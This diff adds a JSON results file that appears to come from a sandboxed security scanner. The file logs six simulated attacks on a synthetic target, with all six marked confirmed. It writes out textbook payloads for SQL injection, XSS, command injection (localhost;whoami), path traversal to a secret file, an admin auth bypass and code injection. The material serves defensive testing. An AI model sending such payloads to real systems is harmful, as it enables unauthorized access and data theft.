@@ -1,0 +1,798 @@
+{
+  "sandboxId": "sandbox-57c2fbb3222d",
+  "mode": "simulation",
+  "startedAt": "2026-10-08T16:42:27.668Z",
+  "finishedAt": "2026-10-08T16:42:29.745Z",
+  "target": {
+    "name": "SentinelAI Safe Simulation Target",
+    "url": "http://target:8080",
+    "containerId": "a192247879378705467e1f98a230c439092d7efc17d9932cce68d575d73873d7",
+    "status": "running",
+    "containerName": "sentinelai-target-sandbox-57c2fbb3222d",
+    "internalUrl": "http://target:8080",
+    "browserUrl": null,
+    "healthUrl": "http://127.0.0.1:8080/health",
+    "isolated": true
+  },
+  "containers": [
+    {
+      "id": "a192247879378705467e1f98a230c439092d7efc17d9932cce68d575d73873d7",
+      "role": "target",
+      "status": "running"
+    },
+    {
+      "id": "000738a5138e7259b81fdb5ed2f955578797fe0144c471c570fa95e97f12163f",
+      "role": "attacker",
+      "status": "completed"
+    }
+  ],
+  "findings": [],
+  "staticFindings": [],
+  "aiFindings": [],
+  "runtime": {
+    "attacks": [
+      {
+        "id": "atk-7f46704b26d8",
+        "findingId": "runtime-sqli",
+        "tool": "runtime-generic",
+        "attackType": "sqli",
+        "target": "http://target:8080",
+        "status": "success",
+        "payload": "' OR '1'='1",
+        "request": {
+          "method": "GET",
+          "url": "http://target:8080/search?q=%27%20OR%20%271%27%3D%271"
+        },
+        "response": {
+          "statusCode": 200,
+          "body": "{\"fixture\":\"sqli\",\"vulnerable\":true,\"query\":\"SELECT * FROM users WHERE name = '' OR '1'='1'\",\"results\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+        },
+        "startedAt": "2026-10-08T16:42:29.643Z",
+        "finishedAt": "2026-10-08T16:42:29.645Z",
+        "evidence": [
+          {
+            "id": "ev-83e5e74e0a00",
+            "type": "request",
+            "timestamp": "2026-10-08T16:42:29.643Z",
+            "source": "runtime-generic",
+            "content": "GET http://target:8080/search?q=%27%20OR%20%271%27%3D%271"
+          },
+          {
+            "id": "ev-e0108a79aa91",
+            "type": "response",
+            "timestamp": "2026-10-08T16:42:29.645Z",
+            "source": "project-runtime",
+            "content": "{\"fixture\":\"sqli\",\"vulnerable\":true,\"query\":\"SELECT * FROM users WHERE name = '' OR '1'='1'\",\"results\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+          },
+          {
+            "id": "ev-d77d57e5dad0",
+            "type": "finding",
+            "timestamp": "2026-10-08T16:42:29.645Z",
+            "source": "runtime-generic",
+            "content": "Runtime behavior matched the expected vulnerability signal."
+          }
+        ]
+      },
+      {
+        "id": "atk-8edbf771fdd4",
+        "findingId": "runtime-xss",
+        "tool": "runtime-generic",
+        "attackType": "xss",
+        "target": "http://target:8080",
+        "status": "success",
+        "payload": "<script>alert(1)</script>",
+        "request": {
+          "method": "GET",
+          "url": "http://target:8080/greet?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+        },
+        "response": {
+          "statusCode": 200,
+          "body": "<html><body>Hello <script>alert(1)</script></body></html>"
+        },
+        "startedAt": "2026-10-08T16:42:29.645Z",
+        "finishedAt": "2026-10-08T16:42:29.646Z",
+        "evidence": [
+          {
+            "id": "ev-83e5e74e0a00",
+            "type": "request",
+            "timestamp": "2026-10-08T16:42:29.645Z",
+            "source": "runtime-generic",
+            "content": "GET http://target:8080/greet?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+          },
+          {
+            "id": "ev-e0108a79aa91",
+            "type": "response",
+            "timestamp": "2026-10-08T16:42:29.646Z",
+            "source": "project-runtime",
+            "content": "<html><body>Hello <script>alert(1)</script></body></html>"
+          },
+          {
+            "id": "ev-d77d57e5dad0",
+            "type": "finding",
+            "timestamp": "2026-10-08T16:42:29.646Z",
+            "source": "runtime-generic",
+            "content": "Runtime behavior matched the expected vulnerability signal."
+          }
+        ]
+      },
+      {
+        "id": "atk-bee66ed811b0",
+        "findingId": "runtime-cmdi",
+        "tool": "runtime-generic",
+        "attackType": "cmdi",
+        "target": "http://target:8080",
+        "status": "success",
+        "payload": "localhost;whoami",
+        "request": {
+          "method": "GET",
+          "url": "http://target:8080/ping?host=localhost%3Bwhoami"
+        },
+        "response": {
+          "statusCode": 200,
+          "body": "{\"fixture\":\"cmdi\",\"vulnerable\":true,\"simulatedCommand\":\"ping -c 1 localhost;whoami\",\"simulatedOutput\":\"uid=1000(sentinel) gid=1000(sentinel)\",\"note\":\"No command is executed. This response is synthetic.\"}"
+        },
+        "startedAt": "2026-10-08T16:42:29.646Z",
+        "finishedAt": "2026-10-08T16:42:29.647Z",
+        "evidence": [
+          {
+            "id": "ev-83e5e74e0a00",
+            "type": "request",
+            "timestamp": "2026-10-08T16:42:29.646Z",
+            "source": "runtime-generic",
+            "content": "GET http://target:8080/ping?host=localhost%3Bwhoami"
+          },
+          {
+            "id": "ev-e0108a79aa91",
+            "type": "response",
+            "timestamp": "2026-10-08T16:42:29.647Z",
+            "source": "project-runtime",
+            "content": "{\"fixture\":\"cmdi\",\"vulnerable\":true,\"simulatedCommand\":\"ping -c 1 localhost;whoami\",\"simulatedOutput\":\"uid=1000(sentinel) gid=1000(sentinel)\",\"note\":\"No command is executed. This response is synthetic.\"}"
+          },
+          {
+            "id": "ev-d77d57e5dad0",
+            "type": "finding",
+            "timestamp": "2026-10-08T16:42:29.647Z",
+            "source": "runtime-generic",
+            "content": "Runtime behavior matched the expected vulnerability signal."
+          }
+        ]
+      },
+      {
+        "id": "atk-8534e7029e48",
+        "findingId": "runtime-path-traversal",
+        "tool": "runtime-generic",
+        "attackType": "path_traversal",
+        "target": "http://target:8080",
+        "status": "success",
+        "payload": "../secret.txt",
+        "request": {
+          "method": "GET",
+          "url": "http://target:8080/file?name=..%2Fsecret.txt"
+        },
+        "response": {
+          "statusCode": 200,
+          "body": "{\"fixture\":\"path_traversal\",\"vulnerable\":true,\"requested\":\"../secret.txt\",\"content\":\"SIMULATED_SECRET_VALUE\"}"
+        },
+        "startedAt": "2026-10-08T16:42:29.647Z",
+        "finishedAt": "2026-10-08T16:42:29.648Z",
+        "evidence": [
+          {
+            "id": "ev-83e5e74e0a00",
+            "type": "request",
+            "timestamp": "2026-10-08T16:42:29.647Z",
+            "source": "runtime-generic",
+            "content": "GET http://target:8080/file?name=..%2Fsecret.txt"
+          },
+          {
+            "id": "ev-e0108a79aa91",
+            "type": "response",
+            "timestamp": "2026-10-08T16:42:29.648Z",
+            "source": "project-runtime",
+            "content": "{\"fixture\":\"path_traversal\",\"vulnerable\":true,\"requested\":\"../secret.txt\",\"content\":\"SIMULATED_SECRET_VALUE\"}"
+          },
+          {
+            "id": "ev-d77d57e5dad0",
+            "type": "finding",
+            "timestamp": "2026-10-08T16:42:29.648Z",
+            "source": "runtime-generic",
+            "content": "Runtime behavior matched the expected vulnerability signal."
+          }
+        ]
+      },
+      {
+        "id": "atk-cfab8cdd4cc9",
+        "findingId": "runtime-auth-bypass",
+        "tool": "runtime-generic",
+        "attackType": "auth_bypass",
+        "target": "http://target:8080",
+        "status": "success",
+        "payload": "Unauthenticated GET /admin",
+        "request": {
+          "method": "GET",
+          "url": "http://target:8080/admin"
+        },
+        "response": {
+          "statusCode": 200,
+          "body": "{\"fixture\":\"auth_bypass\",\"vulnerable\":true,\"message\":\"Simulated protected administrator data\",\"users\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+        },
+        "startedAt": "2026-10-08T16:42:29.648Z",
+        "finishedAt": "2026-10-08T16:42:29.648Z",
+        "evidence": [
+          {
+            "id": "ev-83e5e74e0a00",
+            "type": "request",
+            "timestamp": "2026-10-08T16:42:29.648Z",
+            "source": "runtime-generic",
+            "content": "GET http://target:8080/admin"
+          },
+          {
+            "id": "ev-e0108a79aa91",
+            "type": "response",
+            "timestamp": "2026-10-08T16:42:29.648Z",
+            "source": "project-runtime",
+            "content": "{\"fixture\":\"auth_bypass\",\"vulnerable\":true,\"message\":\"Simulated protected administrator data\",\"users\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+          },
+          {
+            "id": "ev-d77d57e5dad0",
+            "type": "finding",
+            "timestamp": "2026-10-08T16:42:29.648Z",
+            "source": "runtime-generic",
+            "content": "Runtime behavior matched the expected vulnerability signal."
+          }
+        ]
+      },
+      {
+        "id": "atk-290199d271ef",
+        "findingId": "runtime-code-injection",
+        "tool": "runtime-generic",
+        "attackType": "code_injection",
+        "target": "http://target:8080",
+        "status": "success",
+        "payload": "process.env",
+        "request": {
+          "method": "GET",
+          "url": "http://target:8080/eval?code=process.env"
+        },
+        "response": {
+          "statusCode": 200,
+          "body": "{\"fixture\":\"code_injection\",\"vulnerable\":true,\"input\":\"process.env\",\"simulatedEnvironment\":{\"NODE_ENV\":\"simulation\",\"HOME\":\"/home/sentinel\",\"PATH\":\"/usr/local/bin:/usr/bin\"},\"note\":\"No code is executed. This response is synthetic.\"}"
+        },
+        "startedAt": "2026-10-08T16:42:29.648Z",
+        "finishedAt": "2026-10-08T16:42:29.649Z",
+        "evidence": [
+          {
+            "id": "ev-83e5e74e0a00",
+            "type": "request",
+            "timestamp": "2026-10-08T16:42:29.648Z",
+            "source": "runtime-generic",
+            "content": "GET http://target:8080/eval?code=process.env"
+          },
+          {
+            "id": "ev-e0108a79aa91",
+            "type": "response",
+            "timestamp": "2026-10-08T16:42:29.649Z",
+            "source": "project-runtime",
+            "content": "{\"fixture\":\"code_injection\",\"vulnerable\":true,\"input\":\"process.env\",\"simulatedEnvironment\":{\"NODE_ENV\":\"simulation\",\"HOME\":\"/home/sentinel\",\"PATH\":\"/usr/local/bin:/usr/bin\"},\"note\":\"No code is executed. This response is synthetic.\"}"
+          },
+          {
+            "id": "ev-d77d57e5dad0",
+            "type": "finding",
+            "timestamp": "2026-10-08T16:42:29.649Z",
+            "source": "runtime-generic",
+            "content": "Runtime behavior matched the expected vulnerability signal."
+          }
+        ]
+      }
+    ],
+    "validations": [
+      {
+        "findingId": "runtime-sqli",
+        "source": "runtime",
+        "attackType": "sqli",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-7f46704b26d8"
+      },
+      {
+        "findingId": "runtime-xss",
+        "source": "runtime",
+        "attackType": "xss",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-8edbf771fdd4"
+      },
+      {
+        "findingId": "runtime-cmdi",
+        "source": "runtime",
+        "attackType": "cmdi",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-bee66ed811b0"
+      },
+      {
+        "findingId": "runtime-path-traversal",
+        "source": "runtime",
+        "attackType": "path_traversal",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-8534e7029e48"
+      },
+      {
+        "findingId": "runtime-auth-bypass",
+        "source": "runtime",
+        "attackType": "auth_bypass",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-cfab8cdd4cc9"
+      },
+      {
+        "findingId": "runtime-code-injection",
+        "source": "runtime",
+        "attackType": "code_injection",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-290199d271ef"
+      }
+    ],
+    "confirmedVulnerabilities": [
+      {
+        "findingId": "runtime-sqli",
+        "source": "runtime",
+        "attackType": "sqli",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-7f46704b26d8"
+      },
+      {
+        "findingId": "runtime-xss",
+        "source": "runtime",
+        "attackType": "xss",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-8edbf771fdd4"
+      },
+      {
+        "findingId": "runtime-cmdi",
+        "source": "runtime",
+        "attackType": "cmdi",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-bee66ed811b0"
+      },
+      {
+        "findingId": "runtime-path-traversal",
+        "source": "runtime",
+        "attackType": "path_traversal",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-8534e7029e48"
+      },
+      {
+        "findingId": "runtime-auth-bypass",
+        "source": "runtime",
+        "attackType": "auth_bypass",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-cfab8cdd4cc9"
+      },
+      {
+        "findingId": "runtime-code-injection",
+        "source": "runtime",
+        "attackType": "code_injection",
+        "result": "confirmed",
+        "confidence": 95,
+        "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+        "attackId": "atk-290199d271ef"
+      }
+    ],
+    "inconclusiveFindings": [],
+    "failedTests": []
+  },
+  "events": [
+    {
+      "id": "evt-62a149ae20c0",
+      "step": 1,
+      "timestamp": "2026-10-08T16:42:27.668Z",
+      "stage": "initialization",
+      "status": "started",
+      "description": "Initializing isolated Safe Simulation environment."
+    },
+    {
+      "id": "evt-9a758b136c56",
+      "step": 2,
+      "timestamp": "2026-10-08T16:42:27.744Z",
+      "stage": "initialization",
+      "status": "success",
+      "description": "Docker 29.8.1 is available."
+    },
+    {
+      "id": "evt-c3466f4f9946",
+      "step": 3,
+      "timestamp": "2026-10-08T16:42:27.832Z",
+      "stage": "initialization",
+      "status": "success",
+      "description": "Required sandbox images are available."
+    },
+    {
+      "id": "evt-044ff177f859",
+      "step": 4,
+      "timestamp": "2026-10-08T16:42:27.875Z",
+      "stage": "network",
+      "status": "success",
+      "description": "Isolated internal Docker network created for Safe Simulation."
+    },
+    {
+      "id": "evt-61d1e83cf925",
+      "step": 5,
+      "timestamp": "2026-10-08T16:42:28.235Z",
+      "stage": "target",
+      "status": "running",
+      "description": "Synthetic Safe Simulation target started at http://target:8080."
+    },
+    {
+      "id": "evt-acc9b63caaa8",
+      "step": 6,
+      "timestamp": "2026-10-08T16:42:29.239Z",
+      "stage": "target",
+      "status": "success",
+      "description": "Synthetic Safe Simulation target is healthy inside the isolated sandbox at http://target:8080."
+    },
+    {
+      "id": "evt-d3e03e4fc1cd",
+      "step": 7,
+      "timestamp": "2026-10-08T16:42:29.239Z",
+      "stage": "attack",
+      "status": "success",
+      "description": "6 runtime validation plan(s) created."
+    },
+    {
+      "id": "evt-67309cdd74a6",
+      "step": 8,
+      "timestamp": "2026-10-08T16:42:29.745Z",
+      "stage": "attack",
+      "status": "success",
+      "description": "6 validation attack(s) completed."
+    },
+    {
+      "id": "evt-31f864c6d3fa",
+      "step": 9,
+      "timestamp": "2026-10-08T16:42:29.745Z",
+      "stage": "evidence",
+      "status": "success",
+      "description": "Validation evidence normalized and verdicts generated."
+    }
+  ],
+  "attacks": [
+    {
+      "id": "atk-7f46704b26d8",
+      "findingId": "runtime-sqli",
+      "tool": "runtime-generic",
+      "attackType": "sqli",
+      "target": "http://target:8080",
+      "status": "success",
+      "payload": "' OR '1'='1",
+      "request": {
+        "method": "GET",
+        "url": "http://target:8080/search?q=%27%20OR%20%271%27%3D%271"
+      },
+      "response": {
+        "statusCode": 200,
+        "body": "{\"fixture\":\"sqli\",\"vulnerable\":true,\"query\":\"SELECT * FROM users WHERE name = '' OR '1'='1'\",\"results\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+      },
+      "startedAt": "2026-10-08T16:42:29.643Z",
+      "finishedAt": "2026-10-08T16:42:29.645Z",
+      "evidence": [
+        {
+          "id": "ev-83e5e74e0a00",
+          "type": "request",
+          "timestamp": "2026-10-08T16:42:29.643Z",
+          "source": "runtime-generic",
+          "content": "GET http://target:8080/search?q=%27%20OR%20%271%27%3D%271"
+        },
+        {
+          "id": "ev-e0108a79aa91",
+          "type": "response",
+          "timestamp": "2026-10-08T16:42:29.645Z",
+          "source": "project-runtime",
+          "content": "{\"fixture\":\"sqli\",\"vulnerable\":true,\"query\":\"SELECT * FROM users WHERE name = '' OR '1'='1'\",\"results\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+        },
+        {
+          "id": "ev-d77d57e5dad0",
+          "type": "finding",
+          "timestamp": "2026-10-08T16:42:29.645Z",
+          "source": "runtime-generic",
+          "content": "Runtime behavior matched the expected vulnerability signal."
+        }
+      ]
+    },
+    {
+      "id": "atk-8edbf771fdd4",
+      "findingId": "runtime-xss",
+      "tool": "runtime-generic",
+      "attackType": "xss",
+      "target": "http://target:8080",
+      "status": "success",
+      "payload": "<script>alert(1)</script>",
+      "request": {
+        "method": "GET",
+        "url": "http://target:8080/greet?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+      },
+      "response": {
+        "statusCode": 200,
+        "body": "<html><body>Hello <script>alert(1)</script></body></html>"
+      },
+      "startedAt": "2026-10-08T16:42:29.645Z",
+      "finishedAt": "2026-10-08T16:42:29.646Z",
+      "evidence": [
+        {
+          "id": "ev-83e5e74e0a00",
+          "type": "request",
+          "timestamp": "2026-10-08T16:42:29.645Z",
+          "source": "runtime-generic",
+          "content": "GET http://target:8080/greet?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+        },
+        {
+          "id": "ev-e0108a79aa91",
+          "type": "response",
+          "timestamp": "2026-10-08T16:42:29.646Z",
+          "source": "project-runtime",
+          "content": "<html><body>Hello <script>alert(1)</script></body></html>"
+        },
+        {
+          "id": "ev-d77d57e5dad0",
+          "type": "finding",
+          "timestamp": "2026-10-08T16:42:29.646Z",
+          "source": "runtime-generic",
+          "content": "Runtime behavior matched the expected vulnerability signal."
+        }
+      ]
+    },
+    {
+      "id": "atk-bee66ed811b0",
+      "findingId": "runtime-cmdi",
+      "tool": "runtime-generic",
+      "attackType": "cmdi",
+      "target": "http://target:8080",
+      "status": "success",
+      "payload": "localhost;whoami",
+      "request": {
+        "method": "GET",
+        "url": "http://target:8080/ping?host=localhost%3Bwhoami"
+      },
+      "response": {
+        "statusCode": 200,
+        "body": "{\"fixture\":\"cmdi\",\"vulnerable\":true,\"simulatedCommand\":\"ping -c 1 localhost;whoami\",\"simulatedOutput\":\"uid=1000(sentinel) gid=1000(sentinel)\",\"note\":\"No command is executed. This response is synthetic.\"}"
+      },
+      "startedAt": "2026-10-08T16:42:29.646Z",
+      "finishedAt": "2026-10-08T16:42:29.647Z",
+      "evidence": [
+        {
+          "id": "ev-83e5e74e0a00",
+          "type": "request",
+          "timestamp": "2026-10-08T16:42:29.646Z",
+          "source": "runtime-generic",
+          "content": "GET http://target:8080/ping?host=localhost%3Bwhoami"
+        },
+        {
+          "id": "ev-e0108a79aa91",
+          "type": "response",
+          "timestamp": "2026-10-08T16:42:29.647Z",
+          "source": "project-runtime",
+          "content": "{\"fixture\":\"cmdi\",\"vulnerable\":true,\"simulatedCommand\":\"ping -c 1 localhost;whoami\",\"simulatedOutput\":\"uid=1000(sentinel) gid=1000(sentinel)\",\"note\":\"No command is executed. This response is synthetic.\"}"
+        },
+        {
+          "id": "ev-d77d57e5dad0",
+          "type": "finding",
+          "timestamp": "2026-10-08T16:42:29.647Z",
+          "source": "runtime-generic",
+          "content": "Runtime behavior matched the expected vulnerability signal."
+        }
+      ]
+    },
+    {
+      "id": "atk-8534e7029e48",
+      "findingId": "runtime-path-traversal",
+      "tool": "runtime-generic",
+      "attackType": "path_traversal",
+      "target": "http://target:8080",
+      "status": "success",
+      "payload": "../secret.txt",
+      "request": {
+        "method": "GET",
+        "url": "http://target:8080/file?name=..%2Fsecret.txt"
+      },
+      "response": {
+        "statusCode": 200,
+        "body": "{\"fixture\":\"path_traversal\",\"vulnerable\":true,\"requested\":\"../secret.txt\",\"content\":\"SIMULATED_SECRET_VALUE\"}"
+      },
+      "startedAt": "2026-10-08T16:42:29.647Z",
+      "finishedAt": "2026-10-08T16:42:29.648Z",
+      "evidence": [
+        {
+          "id": "ev-83e5e74e0a00",
+          "type": "request",
+          "timestamp": "2026-10-08T16:42:29.647Z",
+          "source": "runtime-generic",
+          "content": "GET http://target:8080/file?name=..%2Fsecret.txt"
+        },
+        {
+          "id": "ev-e0108a79aa91",
+          "type": "response",
+          "timestamp": "2026-10-08T16:42:29.648Z",
+          "source": "project-runtime",
+          "content": "{\"fixture\":\"path_traversal\",\"vulnerable\":true,\"requested\":\"../secret.txt\",\"content\":\"SIMULATED_SECRET_VALUE\"}"
+        },
+        {
+          "id": "ev-d77d57e5dad0",
+          "type": "finding",
+          "timestamp": "2026-10-08T16:42:29.648Z",
+          "source": "runtime-generic",
+          "content": "Runtime behavior matched the expected vulnerability signal."
+        }
+      ]
+    },
+    {
+      "id": "atk-cfab8cdd4cc9",
+      "findingId": "runtime-auth-bypass",
+      "tool": "runtime-generic",
+      "attackType": "auth_bypass",
+      "target": "http://target:8080",
+      "status": "success",
+      "payload": "Unauthenticated GET /admin",
+      "request": {
+        "method": "GET",
+        "url": "http://target:8080/admin"
+      },
+      "response": {
+        "statusCode": 200,
+        "body": "{\"fixture\":\"auth_bypass\",\"vulnerable\":true,\"message\":\"Simulated protected administrator data\",\"users\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+      },
+      "startedAt": "2026-10-08T16:42:29.648Z",
+      "finishedAt": "2026-10-08T16:42:29.648Z",
+      "evidence": [
+        {
+          "id": "ev-83e5e74e0a00",
+          "type": "request",
+          "timestamp": "2026-10-08T16:42:29.648Z",
+          "source": "runtime-generic",
+          "content": "GET http://target:8080/admin"
+        },
+        {
+          "id": "ev-e0108a79aa91",
+          "type": "response",
+          "timestamp": "2026-10-08T16:42:29.648Z",
+          "source": "project-runtime",
+          "content": "{\"fixture\":\"auth_bypass\",\"vulnerable\":true,\"message\":\"Simulated protected administrator data\",\"users\":[{\"id\":1,\"username\":\"demo_admin\",\"email\":\"admin@example.local\",\"role\":\"administrator\"},{\"id\":2,\"username\":\"demo_student\",\"email\":\"student@example.local\",\"role\":\"user\"}]}"
+        },
+        {
+          "id": "ev-d77d57e5dad0",
+          "type": "finding",
+          "timestamp": "2026-10-08T16:42:29.648Z",
+          "source": "runtime-generic",
+          "content": "Runtime behavior matched the expected vulnerability signal."
+        }
+      ]
+    },
+    {
+      "id": "atk-290199d271ef",
+      "findingId": "runtime-code-injection",
+      "tool": "runtime-generic",
+      "attackType": "code_injection",
+      "target": "http://target:8080",
+      "status": "success",
+      "payload": "process.env",
+      "request": {
+        "method": "GET",
+        "url": "http://target:8080/eval?code=process.env"
+      },
+      "response": {
+        "statusCode": 200,
+        "body": "{\"fixture\":\"code_injection\",\"vulnerable\":true,\"input\":\"process.env\",\"simulatedEnvironment\":{\"NODE_ENV\":\"simulation\",\"HOME\":\"/home/sentinel\",\"PATH\":\"/usr/local/bin:/usr/bin\"},\"note\":\"No code is executed. This response is synthetic.\"}"
+      },
+      "startedAt": "2026-10-08T16:42:29.648Z",
+      "finishedAt": "2026-10-08T16:42:29.649Z",
+      "evidence": [
+        {
+          "id": "ev-83e5e74e0a00",
+          "type": "request",
+          "timestamp": "2026-10-08T16:42:29.648Z",
+          "source": "runtime-generic",
+          "content": "GET http://target:8080/eval?code=process.env"
+        },
+        {
+          "id": "ev-e0108a79aa91",
+          "type": "response",
+          "timestamp": "2026-10-08T16:42:29.649Z",
+          "source": "project-runtime",
+          "content": "{\"fixture\":\"code_injection\",\"vulnerable\":true,\"input\":\"process.env\",\"simulatedEnvironment\":{\"NODE_ENV\":\"simulation\",\"HOME\":\"/home/sentinel\",\"PATH\":\"/usr/local/bin:/usr/bin\"},\"note\":\"No code is executed. This response is synthetic.\"}"
+        },
+        {
+          "id": "ev-d77d57e5dad0",
+          "type": "finding",
+          "timestamp": "2026-10-08T16:42:29.649Z",
+          "source": "runtime-generic",
+          "content": "Runtime behavior matched the expected vulnerability signal."
+        }
+      ]
+    }
+  ],
+  "validations": [
+    {
+      "findingId": "runtime-sqli",
+      "source": "runtime",
+      "attackType": "sqli",
+      "result": "confirmed",
+      "confidence": 95,
+      "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+      "attackId": "atk-7f46704b26d8"
+    },
+    {
+      "findingId": "runtime-xss",
+      "source": "runtime",
+      "attackType": "xss",
+      "result": "confirmed",
+      "confidence": 95,
+      "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+      "attackId": "atk-8edbf771fdd4"
+    },
+    {
+      "findingId": "runtime-cmdi",
+      "source": "runtime",
+      "attackType": "cmdi",
+      "result": "confirmed",
+      "confidence": 95,
+      "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+      "attackId": "atk-bee66ed811b0"
+    },
+    {
+      "findingId": "runtime-path-traversal",
+      "source": "runtime",
+      "attackType": "path_traversal",
+      "result": "confirmed",
+      "confidence": 95,
+      "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+      "attackId": "atk-8534e7029e48"
+    },
+    {
+      "findingId": "runtime-auth-bypass",
+      "source": "runtime",
+      "attackType": "auth_bypass",
+      "result": "confirmed",
+      "confidence": 95,
+      "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+      "attackId": "atk-cfab8cdd4cc9"
+    },
+    {
+      "findingId": "runtime-code-injection",
+      "source": "runtime",
+      "attackType": "code_injection",
+      "result": "confirmed",
+      "confidence": 95,
+      "rationale": "Runtime testing reproduced behavior matching the vulnerability signal.",
+      "attackId": "atk-290199d271ef"
+    }
+  ],
+  "summary": {
+    "findings": 0,
+    "tested": 6,
+    "confirmed": 6,
+    "inconclusive": 0,
+    "notReproduced": 0,
+    "runtimeTests": 6,
+    "runtimeSuccessful": 6,
+    "runtimeInconclusive": 0,
+    "runtimeFailed": 0,
+    "durationMs": 2077
+  }
+}
